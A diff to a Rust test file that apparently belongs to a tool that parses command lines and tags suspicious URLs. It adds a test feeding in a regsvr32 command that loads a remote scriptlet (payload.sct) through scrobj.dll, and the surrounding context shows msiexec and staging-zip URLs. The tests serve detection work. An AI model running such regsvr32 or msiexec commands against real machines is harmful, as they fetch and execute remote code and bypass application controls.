@@ -11459,6 +11459,26 @@ $urlzip = "https://ps.example/stage.zip""#,
     }
 
     #[test]
+    fn regsvr32_schemeless_scriptlet_url_argument_emits_typed_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::interp::interpret_line(
+            "regsvr32 /s /n /u /i:regsvr32-schemeless.example/payload.sct scrobj.dll",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::UrlArgument { url, .. }
+                    if url == "http://regsvr32-schemeless.example/payload.sct"
+            )
+        });
+        assert!(
+            has,
+            "regsvr32 schemeless scriptlet URL not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn msiexec_url_package_argument_emits_typed_trait() {
         let mut env = crate::env::Environment::new(&Config::default());
         let url = "https://msiexec-package.example/setup.msi";
